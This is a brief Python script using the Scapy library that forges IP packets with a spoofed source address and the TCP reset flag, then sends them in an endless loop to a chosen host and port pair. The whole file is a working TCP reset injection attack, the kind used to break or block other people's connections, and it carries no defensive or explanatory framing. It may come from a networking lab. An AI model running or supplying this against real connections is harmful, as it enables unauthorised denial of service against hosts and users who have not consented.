from scapy.all import *
import time


def spoof(src_ip, dst_ip, src_port, dst_port):
	IP_Header = IP(src=src_ip, dst=dst_ip)
	print("src_port: " + str(src_port) + "    dst_port: " + str(dst_port))
	TCP_Header = TCP(sport=src_port, dport=dst_port, flags="R")
	payload = "yada yada yada"

	spoofed_packet = IP_Header / TCP_Header / payload
	while True:
		send(spoofed_packet)
		#time.sleep(0.25)
